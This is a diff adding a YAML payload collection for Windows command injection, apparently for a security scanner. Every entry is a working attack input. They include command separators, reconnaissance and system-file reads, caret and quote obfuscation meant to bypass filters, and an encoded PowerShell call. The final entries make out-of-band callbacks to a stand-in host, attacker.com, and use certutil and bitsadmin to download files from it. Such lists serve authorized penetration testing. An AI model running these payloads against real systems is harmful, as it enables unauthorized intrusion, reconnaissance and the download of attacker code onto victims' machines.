@@ -1,0 +1,206 @@
+name: "Command Injection Windows Payloads"
+description: "Command injection payloads for Windows systems"
+attack_type: "cmdi"
+category: "windows"
+
+payloads:
+  # Basic command separators
+  - value: "&whoami"
+    description: "Ampersand separator"
+    tags: ["basic", "ampersand"]
+
+  - value: "&&whoami"
+    description: "AND separator"
+    tags: ["basic", "and"]
+
+  - value: "|whoami"
+    description: "Pipe separator"
+    tags: ["basic", "pipe"]
+
+  - value: "||whoami"
+    description: "OR separator"
+    tags: ["basic", "or"]
+
+  - value: "%0awhoami"
+    description: "URL encoded newline"
+    tags: ["basic", "newline"]
+
+  - value: "\nwhoami"
+    description: "Newline separator"
+    tags: ["basic", "newline"]
+
+  # Common commands
+  - value: "&echo %username%"
+    description: "Current user"
+    tags: ["info", "user"]
+
+  - value: "&hostname"
+    description: "System hostname"
+    tags: ["info", "hostname"]
+
+  - value: "&systeminfo"
+    description: "System information"
+    tags: ["info", "system"]
+
+  - value: "&ipconfig"
+    description: "Network config"
+    tags: ["info", "network"]
+
+  - value: "&ipconfig /all"
+    description: "Full network config"
+    tags: ["info", "network"]
+
+  - value: "&netstat -an"
+    description: "Network connections"
+    tags: ["info", "network"]
+
+  - value: "&tasklist"
+    description: "Process list"
+    tags: ["info", "process"]
+
+  - value: "&dir"
+    description: "Directory listing"
+    tags: ["info", "directory"]
+
+  - value: "&set"
+    description: "Environment variables"
+    tags: ["info", "env"]
+
+  - value: "&net user"
+    description: "User list"
+    tags: ["info", "users"]
+
+  - value: "&net localgroup administrators"
+    description: "Admin group members"
+    tags: ["info", "groups"]
+
+  # File operations
+  - value: "&type C:\\Windows\\win.ini"
+    description: "Read win.ini"
+    tags: ["file-read"]
+
+  - value: "&type C:\\boot.ini"
+    description: "Read boot.ini"
+    tags: ["file-read"]
+
+  - value: "&type %SYSTEMROOT%\\System32\\drivers\\etc\\hosts"
+    description: "Read hosts file"
+    tags: ["file-read"]
+
+  - value: "&more C:\\Windows\\win.ini"
+    description: "Read with more"
+    tags: ["file-read"]
+
+  - value: "&find /v \"\" < C:\\Windows\\win.ini"
+    description: "Read with find"
+    tags: ["file-read"]
+
+  # Quote context breakouts
+  - value: "\"&whoami&\""
+    description: "Double quote break"
+    tags: ["quote", "double"]
+
+  - value: "^&whoami^&"
+    description: "Caret escape"
+    tags: ["quote", "caret"]
+
+  # Encoding and bypass
+  - value: "w^h^o^a^m^i"
+    description: "Caret obfuscation"
+    tags: ["bypass", "caret"]
+
+  - value: "who\"\"ami"
+    description: "Empty string bypass"
+    tags: ["bypass", "empty-string"]
+
+  - value: "wh\"\"oami"
+    description: "Mid-word empty string"
+    tags: ["bypass", "empty-string"]
+
+  - value: "w'h'o'a'm'i"
+    description: "Single quote bypass (PowerShell)"
+    tags: ["bypass", "powershell", "quote"]
+
+  # PowerShell commands
+  - value: "|powershell -c whoami"
+    description: "PowerShell whoami"
+    tags: ["powershell", "basic"]
+
+  - value: "|powershell -c \"Get-Process\""
+    description: "PowerShell get process"
+    tags: ["powershell", "process"]
+
+  - value: "|powershell -c \"Get-Content C:\\Windows\\win.ini\""
+    description: "PowerShell read file"
+    tags: ["powershell", "file-read"]
+
+  - value: "|powershell -c \"$env:USERNAME\""
+    description: "PowerShell username"
+    tags: ["powershell", "info"]
+
+  - value: "|powershell -c \"hostname\""
+    description: "PowerShell hostname"
+    tags: ["powershell", "info"]
+
+  - value: "|powershell -enc d2hvYW1p"
+    description: "PowerShell base64 (whoami)"
+    tags: ["powershell", "base64"]
+
+  # CMD specific
+  - value: "&cmd /c whoami"
+    description: "CMD /c execution"
+    tags: ["cmd", "basic"]
+
+  - value: "&cmd /c \"whoami\""
+    description: "CMD with quotes"
+    tags: ["cmd", "basic"]
+
+  # Environment variable bypass
+  - value: "&%COMSPEC% /c whoami"
+    description: "COMSPEC execution"
+    tags: ["bypass", "comspec"]
+
+  - value: "&%SYSTEMROOT%\\System32\\cmd.exe /c whoami"
+    description: "Full path CMD"
+    tags: ["bypass", "fullpath"]
+
+  # Time-based detection
+  - value: "&ping -n 5 127.0.0.1"
+    description: "Ping delay 5 seconds"
+    tags: ["time", "detection"]
+
+  - value: "&timeout /t 5"
+    description: "Timeout 5 seconds"
+    tags: ["time", "detection"]
+
+  - value: "|powershell -c \"Start-Sleep -s 5\""
+    description: "PowerShell sleep"
+    tags: ["time", "powershell"]
+
+  # OOB detection
+  - value: "&nslookup attacker.com"
+    description: "DNS lookup OOB"
+    tags: ["oob", "dns"]
+
+  - value: "&ping -n 1 attacker.com"
+    description: "Ping OOB"
+    tags: ["oob", "ping"]
+
+  - value: "|powershell -c \"Invoke-WebRequest http://attacker.com\""
+    description: "PowerShell web request"
+    tags: ["oob", "powershell"]
+
+  # For loop iteration
+  - value: "&for /F %i in ('whoami') do @echo %i"
+    description: "For loop execution"
+    tags: ["advanced", "for-loop"]
+
+  # Certutil download
+  - value: "&certutil -urlcache -split -f http://attacker.com/x x"
+    description: "Certutil download"
+    tags: ["advanced", "download"]
+
+  # Bitsadmin download
+  - value: "&bitsadmin /transfer j http://attacker.com/x x"
+    description: "Bitsadmin download"
+    tags: ["advanced", "download"]
